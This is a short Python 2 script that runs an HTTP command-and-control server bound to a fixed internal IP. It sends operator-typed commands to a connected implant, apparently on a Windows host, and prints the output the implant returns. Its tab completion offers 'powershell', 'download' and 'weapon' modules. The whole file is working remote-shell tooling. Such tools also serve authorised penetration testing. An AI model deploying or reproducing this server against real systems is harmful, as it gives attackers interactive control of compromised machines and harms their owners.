#!/usr/bin/python
import BaseHTTPServer
import readline

HOST = '10.200.32.131'
PORT = 80


class Handler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):

        cmd = raw_input('{}{}\\>{} '.format(bcolors.OKGREEN, s.headers['Current-Location'], bcolors.ENDC))
        if cmd == 'exit':
            print('{}[!] Connection closed. Press ^C to shutdown the server.'.format(bcolors.WARNING))
        s.send_response(200)
        s.send_header('Content-type', 'text/html')
        s.end_headers()
        s.wfile.write(cmd)


    def do_POST(s):
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-length'])
        content = s.rfile.read(length)
        if content.startswith('#!#'):
            content = "{}{}{}".format(bcolors.FAIL, content[3:], bcolors.ENDC)
        elif content.startswith('!#!'):
            content = "{}{}{}".format(bcolors.WARNING, content[3:], bcolors.ENDC)
        print content

    def log_message(self, format, *args):
        return

def autocomplete(text,state):
    dictionary = ['download', 'exit', 'help', 'powershell', 'session', 'weapon']
    w_dictionary = ['BasicEnum', 'foo1', 'foo2', 'foo3', 'foo4', 'foo5', 'foo6', 'foo7', 'foo8', 'foo9', 'foo10', 'foo11', 'foo12', 'foo13', 'foo14', 'foo15', 'foo16', 'foo17', 'foo18']

    if text.startswith('weapon '):
        text = text[7:]
        results = [x for x in w_dictionary if x.startswith(text)] + [None]
        results[state] = 'weapon ' + results[state]
    else:
        results = [x for x in dictionary if x.startswith(text)] + [None]
    return results[state]


def setup_Readline():
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims('')
    readline.set_completer(autocomplete)

# Colors
class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST, PORT), Handler)

    setup_Readline()

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\n[!] Server is terminated{}'.format(bcolors.ENDC))
        httpd.server_close()
